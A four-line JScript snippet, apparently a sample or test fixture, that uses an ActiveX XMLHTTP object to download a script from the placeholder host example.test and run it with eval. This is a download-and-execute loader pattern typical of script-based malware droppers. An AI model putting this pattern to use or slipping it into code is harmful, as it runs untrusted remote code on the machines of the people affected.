var xhr = new ActiveXObject("Msxml2.XMLHTTP");
xhr.open("GET", "https://example.test/script", false);
xhr.send();
eval(xhr.responseText);
